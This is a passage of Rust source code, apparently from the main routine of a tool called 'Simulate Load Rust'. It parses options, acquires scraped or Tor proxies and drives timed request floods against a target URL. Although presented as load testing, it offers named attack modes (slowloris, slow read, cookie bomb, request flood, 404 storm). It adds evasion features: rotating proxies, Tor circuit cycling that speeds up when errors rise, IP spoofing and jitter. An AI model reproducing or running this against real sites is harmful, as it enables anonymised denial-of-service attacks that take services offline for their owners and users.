                    tor_proxy = Some(other.strip_prefix("--tor-proxy=").unwrap_or("").to_string());
                } else if other.starts_with("--delay=") {
                    delay_ms = other.strip_prefix("--delay=").unwrap_or("").parse().unwrap_or(0);
                } else if other.starts_with("--max-errors=") {
                    max_errors = other.strip_prefix("--max-errors=").unwrap_or("").parse().ok();
                } else if other.starts_with("--save-proxies=") {
                    save_proxies = Some(other.strip_prefix("--save-proxies=").unwrap_or("").to_string());
                } else if other.starts_with("--config=") {
                    config_file = Some(other.strip_prefix("--config=").unwrap_or("").to_string());
                } else if other.starts_with("--custom-selector=") {
                    custom_selector = Some(other.strip_prefix("--custom-selector=").unwrap_or("").to_string());
                } else if other.starts_with("--pool-max-idle=") {
                    pool_max_idle = other.strip_prefix("--pool-max-idle=").unwrap_or("").parse().unwrap_or(20);
                } else if other.starts_with("--pool-idle-timeout=") {
                    pool_idle_timeout_secs = other.strip_prefix("--pool-idle-timeout=").unwrap_or("").parse().unwrap_or(90);
                } else if other.starts_with("--tor-control=") {
                    tor_control = other.strip_prefix("--tor-control=").unwrap_or("").to_string();
                } else if other.starts_with("--tor-entry-guards=") {
                    tor_entry_guards = Some(other.strip_prefix("--tor-entry-guards=").unwrap_or("").to_string());
                } else if other.starts_with("--tor-bridges=") {
                    tor_bridges = Some(other.strip_prefix("--tor-bridges=").unwrap_or("").to_string());
                } else if other.starts_with("--tor-circuit-timeout=") {
                    tor_circuit_timeout = other.strip_prefix("--tor-circuit-timeout=").unwrap_or("").parse().ok();
                } else if other.starts_with("--tor-ssthresh=") {
                    tor_ssthresh = other.strip_prefix("--tor-ssthresh=").unwrap_or("").parse().unwrap_or(20);
                } else if other.starts_with("--report=") {
                    report_file = Some(other.strip_prefix("--report=").unwrap_or("").to_string());
                } else if other.starts_with("--sni=") {
                    sni = Some(other.strip_prefix("--sni=").unwrap_or("").to_string());
                } else if other.starts_with("--jitter=") {
                    jitter_ms = other.strip_prefix("--jitter=").unwrap_or("").parse().unwrap_or(0);
                } else if other == "--auto-tune" {
                    auto_tune = true;
                } else if other == "--tui" {
                    tui = true;
                } else if other == "--spoof-ip" {
                    spoof_ip = true;
                } else if other == "--quiet" {
                    quiet = true;
                } else if other == "--json" {
                    json_output = true;
                } else if other == "--canary" {
                    canary = true;
                } else if other.starts_with("--rate=") {
                    rate_limit = other.strip_prefix("--rate=").unwrap_or("").parse().ok();
                } else if other.starts_with("--max-redirects=") {
                    max_redirects = other.strip_prefix("--max-redirects=").unwrap_or("").parse().unwrap_or(10);
                } else if other.starts_with("--rotation-strategy=") {
                    rotation_strategy = other.strip_prefix("--rotation-strategy=").unwrap_or("").to_string();
                } else if other.starts_with("--log-file=") {
                    log_file = Some(other.strip_prefix("--log-file=").unwrap_or("").to_string());
                } else if other.starts_with("--stats-interval=") {
                    stats_interval_secs = other.strip_prefix("--stats-interval=").unwrap_or("").parse().unwrap_or(5);
                } else if other.starts_with("--tor-circuits=") {
                    tor_circuits = other.strip_prefix("--tor-circuits=").unwrap_or("").parse().unwrap_or(10);
                } else if other.starts_with("--ramp-up=") {
                    ramp_up_secs = other.strip_prefix("--ramp-up=").unwrap_or("").parse().unwrap_or(0);
                } else if other.starts_with("--body=") {
                    let val = other.strip_prefix("--body=").unwrap_or("").to_string();
                    let _ = CUSTOM_POST_BODY.set(val);
                } else if other.starts_with("--content-type=") {
                    let val = other.strip_prefix("--content-type=").unwrap_or("").to_string();
                    let _ = CUSTOM_CONTENT_TYPE.set(val);
                } else if other.starts_with('-') {
                    eprintln!("Unknown option: {}", other);
                    std::process::exit(1);
                } else {
                    positional.push(other.to_string());
                }
            }
        }
    }

    let mut target_url = positional.first().cloned().unwrap_or_else(|| DEFAULT_TARGET_URL.to_string());
    let mut mode_str = positional.get(1).cloned().unwrap_or_else(|| "scrape".to_string());
    let mut attack_str = positional.get(2).cloned().unwrap_or_else(|| "normal".to_string());
    let mut concurrency: usize = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(20);
    let mut duration_secs: u64 = positional.get(4).and_then(|s| s.parse().ok()).unwrap_or(30);

    // Override with env var defaults (env vars take priority over positional defaults but not CLI flags)
    if let Ok(env_target) = std::env::var("SIMULATE_LOAD_TARGET") {
        if positional.is_empty() { target_url = env_target; }
    }
    if let Ok(env_mode) = std::env::var("SIMULATE_LOAD_MODE") {
        if positional.get(1).is_none() { mode_str = env_mode; }
    }
    if let Ok(env_attack) = std::env::var("SIMULATE_LOAD_ATTACK") {
        if positional.get(2).is_none() { attack_str = env_attack; }
    }
    if let Ok(env_conc) = std::env::var("SIMULATE_LOAD_CONCURRENCY") {
        if positional.get(3).is_none() {
            if let Ok(parsed) = env_conc.parse::<usize>() { concurrency = parsed; }
        }
    }
    if let Ok(env_dur) = std::env::var("SIMULATE_LOAD_DURATION") {
        if positional.get(4).is_none() {
            if let Ok(parsed) = env_dur.parse::<u64>() { duration_secs = parsed; }
        }
    }

    // Load configurations from config file if supplied
    if let Some(path) = &config_file {
        if let Ok(content) = std::fs::read_to_string(path) {
            println!("  Loading config from {}...", path);
            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() || trimmed.starts_with('#') { continue; }
                if let Some(pos) = trimmed.find('=') {
                    let key = trimmed[..pos].trim();
                    let val = trimmed[pos+1..].trim();
                    match key {
                        "target_url" | "target" => target_url = val.to_string(),
                        "mode" => mode_str = val.to_string(),
                        "attack" | "attack_mode" => attack_str = val.to_string(),
                        "concurrency" => if let Ok(parsed) = val.parse() { concurrency = parsed; },
                        "duration" | "duration_secs" => if let Ok(parsed) = val.parse() { duration_secs = parsed; },
                        "delay" | "delay_ms" => if let Ok(parsed) = val.parse() { delay_ms = parsed; },
                        "max_errors" => max_errors = val.parse().ok(),
                        "proxy_file" => proxy_file = Some(val.to_string()),
                        "tor_proxy" => tor_proxy = Some(val.to_string()),
                        "tor_entry_guards" => tor_entry_guards = Some(val.to_string()),
                        "tor_bridges" => tor_bridges = Some(val.to_string()),
                        "tor_circuit_timeout" => tor_circuit_timeout = val.parse().ok(),
                        "tor_ssthresh" => if let Ok(parsed) = val.parse() { tor_ssthresh = parsed; },
                        "save_proxies" => save_proxies = Some(val.to_string()),
                        "output_csv" | "output" => output_csv = Some(val.to_string()),
                        "custom_selector" => custom_selector = Some(val.to_string()),
                        "pool_max_idle" => if let Ok(parsed) = val.parse() { pool_max_idle = parsed; },
                        "pool_idle_timeout" => if let Ok(parsed) = val.parse() { pool_idle_timeout_secs = parsed; },
                        "tor_control" => tor_control = val.to_string(),
                        "sni" => sni = Some(val.to_string()),
                        "jitter" | "jitter_ms" => if let Ok(parsed) = val.parse() { jitter_ms = parsed; },
                        "auto_tune" => auto_tune = val.parse().unwrap_or(false),
                        "tui" => tui = val.parse().unwrap_or(false),
                        "spoof_ip" => spoof_ip = val.parse().unwrap_or(false),
                        "quiet" => quiet = val.parse().unwrap_or(false),
                        "json" => json_output = val.parse().unwrap_or(false),
                        "rate_limit" => if let Ok(parsed) = val.parse() { rate_limit = Some(parsed); },
                        "max_redirects" => if let Ok(parsed) = val.parse() { max_redirects = parsed; },
                        "rotation_strategy" => rotation_strategy = val.to_string(),
                        "log_file" => log_file = Some(val.to_string()),
                        "canary" => canary = val.parse().unwrap_or(false),
                        "stats_interval" => if let Ok(parsed) = val.parse() { stats_interval_secs = parsed; },
                        "tor_circuits" => if let Ok(parsed) = val.parse() { tor_circuits = parsed; },
                        "ramp_up" | "ramp_up_secs" => if let Ok(parsed) = val.parse() { ramp_up_secs = parsed; },
                        "body" | "post_body" => { let _ = CUSTOM_POST_BODY.set(val.to_string()); },
                        "content_type" | "content-type" => { let _ = CUSTOM_CONTENT_TYPE.set(val.to_string()); },
                        _ => {}
                    }
                }
            }
        } else {
            eprintln!("  Warning: Config file {} not found or unreadable.", path);
        }
    }

    if spoof_ip {
        SPOOF_IP.store(true, Ordering::Relaxed);
    }

    // Initialize DNS pinning and ClientConfig
    let pinned_dns = if mode_str == "tor" || mode_str == "scrape-tor" {
        None
    } else {
        resolve_target_dns(&target_url).await.map(|ip| {
            let host = Url::parse(&target_url)
                .ok()
                .and_then(|u| u.host_str().map(|s| s.to_string()))
                .unwrap_or_default();
            (host, ip)
        })
    };
    let timeout_secs = match attack_str.as_str() {
        "slowloris" | "slowread" => 60,
        _ => 10,
    };
    let config = ClientConfig {
        pinned_dns,
        max_redirects,
        tor_circuits,
        rate_limit,
        pool_max_idle,
        pool_idle_timeout: Duration::from_secs(pool_idle_timeout_secs),
        sni: sni.clone(),
        timeout: Duration::from_secs(timeout_secs),
        insecure,
        custom_user_agent: user_agent.clone(),
        custom_headers: custom_headers.iter().filter_map(|h| {
            let parts: Vec<&str> = h.splitn(2, ':').collect();
            if parts.len() == 2 { Some((parts[0].trim().to_string(), parts[1].trim().to_string())) }
            else { None }
        }).collect(),
    };

    if tor_only {
        let state = Arc::new(Mutex::new(AppState::new()));
        {
            let mut st = state.lock().await;
            st.target_url = target_url.to_string();
            st.mode = ProxyMode::Tor;
            st.client_config = config.clone();
            st.verbose = verbose;
        }
        println!("[tor-only] Checking Tor...");
        let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
        if !ok && tor_proxy.is_none() {
            eprintln!("  [tor-only] Tor not available. Install Tor or use --tor-proxy.");
            std::process::exit(1);
        }
        if ok {
            println!("  Tor OK (local relay)");
        } else {
            println!("  Using custom Tor proxy");
        }
        println!("  [TOR-ONLY] Configuration verified. Ready for Tor-based load testing.");
        return;
    }

    if verify {
        println!("=== Simulate Load Rust ===");
        println!("Target: {}", target_url);
        println!("Mode: {} (proxy: {})", attack_str, mode_str);
        println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
        println!();

        // Probe domain
        let state = Arc::new(Mutex::new(AppState::new()));
        if (mode_str == "tor" || mode_str == "scrape-tor") && (tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some()) {
            println!("  [verify] Configuring Tor parameters via Control Port ({})...", tor_control);
            if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
                eprintln!("  [verify] Warning: Failed to configure Tor via Control Port: {}", e);
            } else {
                println!("  [verify] Tor parameters applied successfully.");
            }
        }
        {
            let mut st = state.lock().await;
            st.target_url = target_url.to_string();
            st.load_concurrency = concurrency;
            st.custom_selector = custom_selector.clone();
            st.client_config = config.clone();
            st.verbose = verbose;
            st.tor_proxy = tor_proxy.clone();
            st.attack_mode = AttackMode::from_str(&attack_str);
            st.mode = ProxyMode::from_str(&mode_str);
        }

        println!("[1/1] Probing domain...");
        probe_domain(&target_url, &state).await;
        let status = {
            let st = state.lock().await;
            st.probe_status.clone()
        };
        println!("  {}", status);
        println!();
        println!("[Done] Probe complete.");
        return;
    }

    if version {
        println!("{} v{}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"));
        return;
    }
    if list_modes {
        println!("Attack modes:");
        println!("  normal        Standard HTTP GET requests with human-like referer trail");
        println!("  bandwidth     Heavy bandwidth consumption");
        println!("  slowread      Slow read (deliberate slow download)");
        println!("  imageopt      Image optimization endpoints");
        println!("  largepost     Large JSON/POST requests with payload templates");
        println!("  assetspray    Spray all static assets");
        println!("  rangereq      Range header requests");
        println!("  cookiebomb    Cookie bomb (many cookies)");
        println!("  ssr           Server-side rendering endpoints");
        println!("  middleware    Middleware/edge endpoint stress");
        println!("  requestflood  No-delay request flood");
        println!("  notfound      404 storm (nonexistent paths)");
        println!("  slowloris     Slow POST/Slowloris stream connection exhaust");
        return;
    }

    println!("=== Simulate Load Rust ===");
    println!("Target: {}", target_url);
    println!("Mode: {} (proxy: {})", attack_str, mode_str);
    println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
    println!();

    // Probe domain
    let state = Arc::new(Mutex::new(AppState::new()));
    if (mode_str == "tor" || mode_str == "scrape-tor") && (tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some()) {
        println!("  Configuring Tor parameters via Control Port ({})...", tor_control);
        if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
            eprintln!("  Warning: Failed to configure Tor via Control Port: {}", e);
        } else {
            println!("  Tor parameters applied successfully.");
        }
    }
    {
        let mut st = state.lock().await;
        st.target_url = target_url.to_string();
        st.load_concurrency = concurrency;
        st.jitter_ms = jitter_ms;
        st.custom_selector = custom_selector.clone();
        st.client_config = config.clone();
        st.tor_proxy = tor_proxy.clone();
        st.verbose = verbose;
        st.attack_mode = match attack_str.as_str() {
            "bandwidth" => AttackMode::Bandwidth,
            "slowread" => AttackMode::SlowRead,
            "imageopt" => AttackMode::ImageOpt,
            "largepost" => AttackMode::LargePost,
            "assetspray" => AttackMode::AssetSpray,
            "rangereq" => AttackMode::RangeReq,
            "cookiebomb" => AttackMode::CookieBomb,
            "ssr" => AttackMode::Ssr,
            "middleware" => AttackMode::Middleware,
            "requestflood" => AttackMode::RequestFlood,
            "notfound" => AttackMode::NotFound,
            "slowloris" => AttackMode::Slowloris,
            _ => AttackMode::Normal,
        };

        match mode_str.as_str() {
            "tor" => st.mode = ProxyMode::Tor,
            "scrape-tor" => st.mode = ProxyMode::ScrapeTorFallback,
            _ => st.mode = ProxyMode::Scrape,
        }
    }

    println!("[1/3] Probing domain...");
    probe_domain(&target_url, &state).await;
    let status = {
        let st = state.lock().await;
        st.probe_status.clone()
    };
    println!("  {}", status);
    println!();
    println!("[2/3] Acquiring proxies...");
    // Handle --proxy-file and --tor-proxy first (bypass scraping)
    let proxies = if let Some(path) = &proxy_file {
        let content = std::fs::read_to_string(path).unwrap_or_default();
        let list: Vec<String> = content
            .split(|c: char| c.is_whitespace() || c == ',')
            .filter_map(|s| { let s = s.trim(); if !s.is_empty() { Some(s.to_string()) } else { None }})
            .collect();
        if list.is_empty() {
            eprintln!("  No proxies found in file {}", path);
            None
        } else {
            println!("  Verifying {} proxies from file...", list.len());
            let verified = filter_alive_proxies(&list, &target_url, &config, &state).await;
            if verified.is_empty() {
                eprintln!("  No alive proxies found in file {}", path);
                None
            } else {
                Some(verified)
            }
        }
    } else if let Some(url) = &tor_proxy {
        let clean_url = url.trim_start_matches("socks5h://").trim_start_matches("socks5://").trim_start_matches("http://");
        Some(vec![format!("socks5h://tor:isolate@{}", clean_url)])
    } else {
        let mode = { state.lock().await.mode };
        get_proxies(mode, &state).await
    };
    match proxies {
        None => {
            eprintln!("  Failed to get proxies. Exiting.");
            std::process::exit(1);
        }
        Some(prox_list) => {
            println!("  Got {} proxies", prox_list.len());
            // Warm up Tor circuits when --tor-proxy is used with Tor mode
            if matches!(mode_str.as_str(), "tor" | "scrape-tor") && tor_proxy.is_some() {
                println!("  Warming {} Tor circuits...", tor_circuits);
                warm_tor_circuits(&prox_list, &target_url, timeout_secs, 1).await;
                println!("  Tor circuits ready.");
            }
            if let Some(ref path) = save_proxies {
                let content = prox_list.join("\n");
                if let Err(e) = std::fs::write(path, content) {
                    eprintln!("  Failed to save proxies to {}: {}", path, e);
                } else {
                    println!("  Saved {} proxies to {}", prox_list.len(), path);
                }
            }
            if dry_run {
                println!("  [DRY RUN] Effective configuration:");
                println!("    Target: {}", target_url);
                println!("    Mode: {}", mode_str);
                println!("    Attack: {}", attack_str);
                println!("    Concurrency: {}", concurrency);
                println!("    Duration: {}s", duration_secs);
                println!("    Delay: {}ms  Jitter: {}ms", delay_ms, jitter_ms);
                if ramp_up_secs > 0 {
                    println!("    Ramp-up: {}s", ramp_up_secs);
                }
                if let Some(body) = CUSTOM_POST_BODY.get() {
                    println!("    Custom body: {}..", &body[..body.len().min(60)]);
                }
                if let Some(ct) = CUSTOM_CONTENT_TYPE.get() {
                    println!("    Content-Type: {}", ct);
                }
                println!("    Proxies found: {}", prox_list.len());
                println!("    Rotation: {}", rotation_strategy);
                if let Some(rate) = rate_limit {
                    println!("    Rate limit: {} req/s", rate);
                }
                println!("    Max redirects: {}", config.max_redirects);
                println!("    Timeout: {:?}", config.timeout);
                println!("    Pool idle timeout: {:?}", config.pool_idle_timeout);
                println!("    Tor circuits: {}", config.tor_circuits);
                println!("    Max errors: {}", max_errors.unwrap_or(999999));
                println!("    SSL verify: {}", !config.insecure);
                println!("    IP spoofing: {}", spoof_ip);
                println!("    Verbose: {}", verbose);
                if let Some(ref ua) = user_agent {
                    println!("    Custom UA: {}", ua);
                }
                if !custom_headers.is_empty() {
                    println!("    Custom headers: {}", custom_headers.len());
                }
                if let Some(ref lf) = log_file {
                    println!("    Log file: {}", lf);
                }
                if canary {
                    println!("    Canary: enabled");
                }
                if quiet {
                    println!("    Quiet mode: enabled");
                }
                if json_output {
                    println!("    JSON output: enabled");
                }
                println!();
                println!("  [DRY RUN] Skipping load test. Use without --dry-run to execute.");
                // Write CSV output if requested
                if let Some(path) = &output_csv {
                    write_probe_csv(path, &target_url, &status, &prox_list, concurrency, &attack_str);
                }
                return;
            }
            let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list, &config, &rotation_strategy)));
            println!("[3/3] Running load for {}s...", duration_secs);
            {
                let mut s_vec = Vec::with_capacity(prox_list.len());
                // Try to load persisted sessions from file (hash-based naming)
                let mut h = DefaultHasher::new();
                h.write(target_url.as_bytes());
                let safe_name = format!("sessions_{:x}.json", h.finish());
                if let Ok(session_data) = std::fs::read_to_string(&safe_name) {
                    let sessions: Vec<String> = serde_json::from_str(&session_data).unwrap_or_else(|_| vec![]);
                    for (i, sess) in sessions.iter().enumerate() {
                        if i < prox_list.len() {
                            s_vec.push(std::sync::Mutex::new(sess.clone()));
                        }
                    }
                }
                // Fill remaining with empty sessions
                while s_vec.len() < prox_list.len() {
                    s_vec.push(std::sync::Mutex::new(String::new()));
                }
                state.lock().await.sessions = Arc::new(s_vec);
            }
            let stats = {
                let st = state.lock().await;
                st.stats.clone()
            };
            stats.concurrency.store(concurrency, Ordering::Relaxed);
    // Canary: run a single probe request before the actual load test
    if canary {
        println!("  Running canary health check...");
        let canary_client = match reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .redirect(reqwest::redirect::Policy::none())
            .build() {
            Ok(c) => c,
            Err(e) => {
                eprintln!("  WARNING: Failed to build canary client: {}", e);
                reqwest::Client::new()
            }
        };
        match canary_client.get(&target_url).send().await {
            Ok(resp) => {
                let status = resp.status();
                let body_len = resp.content_length().unwrap_or(0);
                println!("  Canary: {} {} ({} bytes)", status, target_url, body_len);
                if !status.is_success() {
                    eprintln!("  WARNING: Canary returned non-success status {}", status);
                }
            }
            Err(e) => {
                eprintln!("  WARNING: Canary failed: {}", e);
            }
        }
        println!("  Canary complete. Starting load test...");
    }

            stats.running.store(true, Ordering::Relaxed);
            
            // Set up Ctrl+C handler for graceful shutdown
            let running_clone = stats.running.clone();
            tokio::spawn(async move {
                if let Err(e) = signal::ctrl_c().await {
                    eprintln!("Failed to listen for Ctrl+C: {}", e);
                    return;
                }
                eprintln!("
  [Ctrl+C received] Shutting down gracefully...");
                running_clone.store(false, Ordering::Relaxed);
            });
            
            let state_clone = state.clone();
            let pool_clone = pool.clone();
            let stats_clone = stats.clone();
            let start = Instant::now();
            let mut elapsed_secs = duration_secs;
            tokio::spawn(run_load(state_clone.clone(), pool_clone, stats_clone, delay_ms, max_errors));
            tokio::spawn(listen_stdin(state_clone.clone()));
            tokio::spawn(ramp_up_concurrency(state_clone, concurrency, ramp_up_secs));

            // Adaptive Tor Circuit Cycling Background Loop
            // Cycles circuits based on observed error rate:
            //   >50% error → cycle every 10s (aggressive)
            //   20-50% error → cycle every 30s (moderate)
            //   <20% error → cycle every 60s (conservative)
            if mode_str == "tor" || mode_str == "scrape-tor" {
                let tor_ctrl = tor_control.clone();
                let stats_tor = stats.clone();
                tokio::spawn(async move {
                    // Check if Tor Control Port is reachable before starting loop
                    // Try both TCP and Unix socket paths
                    let control_reachable = match resolve_control_addr(&tor_ctrl) {
                        Ok((ref addr, ref typ)) => {
                            if typ == "unix" {
                                tokio::net::UnixStream::connect(addr).await.is_ok()
                            } else {
                                tokio::net::TcpStream::connect(addr).await.is_ok()
                            }
                        }
                        Err(_) => false,
                    };
                    if control_reachable {
                        let mut last_total_reqs: u64 = 0;
                        let mut last_errors: u64 = 0;
                        while stats_tor.running.load(Ordering::Relaxed) {
                            tokio::time::sleep(Duration::from_secs(15)).await;
                            if !stats_tor.running.load(Ordering::Relaxed) { break; }
                            
                            // Calculate error rate over the last 15s window
                            let now_reqs = stats_tor.total_requests.load(Ordering::Relaxed);
                            let now_errors = stats_tor.errors.load(Ordering::Relaxed);
                            let req_delta = now_reqs.saturating_sub(last_total_reqs);
                            let err_delta = now_errors.saturating_sub(last_errors);
                            last_total_reqs = now_reqs;
                            last_errors = now_errors;
                            
                            // Determine cycle interval based on error rate
                            let cycle_interval = if req_delta > 0 {
                                let error_rate = err_delta as f64 / req_delta as f64;
                                if error_rate > 0.50 {
                                    10 // Aggressive: high error rate
                                } else if error_rate > 0.20 {
                                    30 // Moderate
                                } else {
                                    60 // Conservative: low error rate
                                }
                            } else {
                                60 // No requests yet, conservative
                            };
                            
                            if stats_tor.running.load(Ordering::Relaxed) {
                                let _ = cycle_tor_circuit(&tor_ctrl).await;
                                if cycle_interval < 30 {
                                    // Sleep briefly before cycling to let the new circuit build
                                    tokio::time::sleep(Duration::from_secs(cycle_interval)).await;
                                }
                            }
                        }
                    } else {
                        println!("  [System] Tor Control Port {} unreachable; skipping dynamic circuit cycling.", tor_ctrl);
                    }
                });
            }

            // Proxy Pool Refresh Background Loop
            if mode_str == "scrape" || mode_str == "scrape-tor" {
                let pool_refresh = pool.clone();
                let state_refresh = state.clone();
                let stats_refresh = stats.clone();
                let config_refresh = config.clone();
                tokio::spawn(async move {
                    while stats_refresh.running.load(Ordering::Relaxed) {
                        tokio::time::sleep(Duration::from_secs(60)).await;
                        if !stats_refresh.running.load(Ordering::Relaxed) { break; }
                        if let Some(new_proxies) = get_proxies(ProxyMode::Scrape, &state_refresh).await {
                            let mut pool_lock = match pool_refresh.lock() {
                                Ok(guard) => guard,
                                Err(e) => {
                                    eprintln!("  Pool refresh lock poisoned: {}", e);
                                    continue;
                                }
                            };
                            let fresh_pool = ProxyPool::new(&new_proxies, &config_refresh, &rotation_strategy);
                            pool_lock.clients.extend(fresh_pool.clients);
                            pool_lock.labels.extend(fresh_pool.labels);
                            let new_n = pool_lock.clients.len();
                            pool_lock.cooldown_until.resize(new_n, Instant::now());
                            pool_lock.failure_tier.resize(new_n, 0);
                            pool_lock.succeeded.resize(new_n, false);
                            pool_lock.weights.resize(new_n, 1.0);
                        }
                    }
                });
            }

            // PID Concurrency Auto-tuning Loop
            if auto_tune {
                let stats_tune = stats.clone();
                let state_tune = state.clone();
                let is_tor_mode = mode_str == "tor" || mode_str == "scrape-tor";
                tokio::spawn(async move {
                    let mut last_errors = 0u64;
                    while stats_tune.running.load(Ordering::Relaxed) {
                        tokio::time::sleep(Duration::from_secs(2)).await;
                        if !stats_tune.running.load(Ordering::Relaxed) { break; }
                        
                        let cur_errors = stats_tune.errors.load(Ordering::Relaxed);
                        let new_errors = cur_errors.saturating_sub(last_errors);
                        last_errors = cur_errors;
                        
                        let (p50, _, _, _) = stats_tune.latency_samples.get_percentiles();
                        let current_conc = stats_tune.concurrency.load(Ordering::Relaxed);
                        
                        let mut target_conc = current_conc;
                        if new_errors > 5 || p50 > 1500 {
                            target_conc = target_conc.saturating_sub(5).max(5);
                        } else if p50 < 400 {
                            let inc = if is_tor_mode && current_conc >= tor_ssthresh { 1 } else { 2 };
                            target_conc = target_conc.saturating_add(inc).min(500);
                        }
                        
                        if target_conc != current_conc {
                            stats_tune.concurrency.store(target_conc, Ordering::Relaxed);
                            state_tune.lock().await.load_concurrency = target_conc;
                        }
                    }
                });
            }

            let mut last_requests = 0u64;
            let mut last_bytes = 0u64;
            let mut last_time = start;

            while start.elapsed().as_secs() < duration_secs {
                tokio::time::sleep(Duration::from_secs(stats_interval_secs)).await;
                let cur_reqs = stats.total_requests.load(Ordering::Relaxed);
                let cur_bytes = stats.total_bytes.load(Ordering::Relaxed);
                let cur_errors = stats.errors.load(Ordering::Relaxed);
                let cur_latency = stats.total_latency_ms.load(Ordering::Relaxed);

                let now = Instant::now();
                let delta_t = now.duration_since(last_time).as_secs_f64();
                
                let mut req_rate = 0.0;
                let mut byte_rate = 0.0;
                if delta_t > 0.0 {
                    req_rate = (cur_reqs - last_requests) as f64 / delta_t;
                    byte_rate = (cur_bytes - last_bytes) as f64 / delta_t / 1024.0;
                }
                let avg_latency = if cur_reqs > 0 { cur_latency as f64 / cur_reqs as f64 } else { 0.0 };
                
                let (p50, p90, p95, p99) = stats.latency_samples.get_percentiles();
                let active_concurrency = stats.concurrency.load(Ordering::Relaxed);
                let elapsed = start.elapsed().as_secs();

                if tui {
                    print!("{}[2J{}[1;1H", 27 as char, 27 as char);
                    println!("========================================================================");
                    println!("   🚀 SIMULATE LOAD RUST — Interactive Testing Dashboard");
                    println!("========================================================================");
                    println!("   Target URL:  {}", target_url);
                    println!("   Attack Mode: {} | Concurrency: {} | Duration: {}s", attack_str, active_concurrency, duration_secs);
                    if ramp_up_secs > 0 {
                        println!("   Ramp-up: {}s", ramp_up_secs);
                    }
                    if let Some((ref host, ip)) = config.pinned_dns {
                        println!("   DNS Pinning: Enabled ({}) -> IP: {}", host, ip);
                    } else {
                        println!("   DNS Pinning: Disabled");
                    }
                    println!("========================================================================");
                    let pct = (elapsed as f64 / duration_secs as f64 * 100.0).min(100.0) as usize;
                    let filled = pct / 4;
                    let empty = 25 - filled;
                    let bar: String = std::iter::repeat_n("█", filled).chain(std::iter::repeat_n("░", empty)).collect();
                    println!("   [Progress]   [{}] {}% (Elapsed: {}s)", bar, pct, elapsed);
                    println!("========================================================================");
                    println!("   [Metrics]");
                    println!("   Req/s:       {:.1} req/s          Bandwidth:   {:.2} KB/s", req_rate, byte_rate);
                    println!("   Successes:   {} (2xx)           Errors:      {} (Timeout: {}, Connect: {}, Other: {})", 
                        stats.status_2xx.load(Ordering::Relaxed), 
                        cur_errors,
                        stats.error_timeout.load(Ordering::Relaxed),
                        stats.error_connect.load(Ordering::Relaxed),
                        stats.error_other.load(Ordering::Relaxed)
                    );
                    println!("   Average RTT: {:.1} ms                Active Prox: {} / {}", 
                        avg_latency, 
                        prox_list.len().saturating_sub(cur_errors as usize), 
                        prox_list.len()
                    );
                    println!("========================================================================");
                    println!("   [Latency Percentiles]");
                    println!("   p50: {}ms   |   p90: {}ms   |   p95: {}ms   |   p99: {}ms", p50, p90, p95, p99);
                    println!("========================================================================");
                    println!("   [Response Codes]");
                    println!("   2xx: {}  |  3xx: {}  |  4xx: {}  |  5xx: {}  |  Other: {}",
                        stats.status_2xx.load(Ordering::Relaxed),
                        stats.status_3xx.load(Ordering::Relaxed),
                        stats.status_4xx.load(Ordering::Relaxed),
                        stats.status_5xx.load(Ordering::Relaxed),
                        stats.status_other.load(Ordering::Relaxed)
                    );
                    println!("========================================================================");
                } else if !quiet {
                    println!(
                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Latency: {:.1}ms (p50: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {} (Timeout: {}, Connect: {}, Other: {})",
                        elapsed, req_rate, byte_rate, avg_latency, p50, p99,
                        stats.status_2xx.load(Ordering::Relaxed),
                        stats.status_3xx.load(Ordering::Relaxed),
                        stats.status_4xx.load(Ordering::Relaxed),
                        stats.status_5xx.load(Ordering::Relaxed),
                        cur_errors,
                        stats.error_timeout.load(Ordering::Relaxed),
                        stats.error_connect.load(Ordering::Relaxed),
                        stats.error_other.load(Ordering::Relaxed)
                    );
                }
                
                last_requests = cur_reqs;
                last_bytes = cur_bytes;
                last_time = now;

                if let Some(max_err) = max_errors {
                    if cur_errors >= max_err {
                        elapsed_secs = start.elapsed().as_secs().max(1);
                        break;
                    }
                }
            }
            stats.running.store(false, Ordering::Relaxed);

            let final_reqs = stats.total_requests.load(Ordering::Relaxed);
            let final_bytes = stats.total_bytes.load(Ordering::Relaxed);
            let final_latency = stats.total_latency_ms.load(Ordering::Relaxed);
            let final_avg_latency = if final_reqs > 0 { final_latency as f64 / final_reqs as f64 } else { 0.0 };
            
            let (p50, p90, p95, p99) = stats.latency_samples.get_percentiles();
            
            let final_stats = format!(
                "Completed: {} req, {} bytes ({:.2} KB/s) | Avg Latency: {:.1}ms (p50: {}ms, p90: {}ms, p95: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {} (Timeout: {}, Connect: {}, Other: {})",
                final_reqs,
                final_bytes,
                final_bytes as f64 / elapsed_secs as f64 / 1024.0,
                final_avg_latency,
                p50, p90, p95, p99,
                stats.status_2xx.load(Ordering::Relaxed),
                stats.status_3xx.load(Ordering::Relaxed),
                stats.status_4xx.load(Ordering::Relaxed),
                stats.status_5xx.load(Ordering::Relaxed),
                stats.errors.load(Ordering::Relaxed),
                stats.error_timeout.load(Ordering::Relaxed),
                stats.error_connect.load(Ordering::Relaxed),
                stats.error_other.load(Ordering::Relaxed)
            );
            if !quiet {
                println!("  {}", final_stats);
            }
            if let Some(ref log_path) = log_file {
                if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
                    use std::io::Write;
                    let _ = writeln!(file, "[{}] {}", elapsed_secs, final_stats);
                }
            }
            if json_output {
                // Output JSON to stdout
                let json = serde_json::json!({
                    "target_url": target_url,
                    "mode": mode_str,
                    "attack_mode": attack_str,
                    "concurrency": concurrency,
                    "duration_secs": duration_secs,
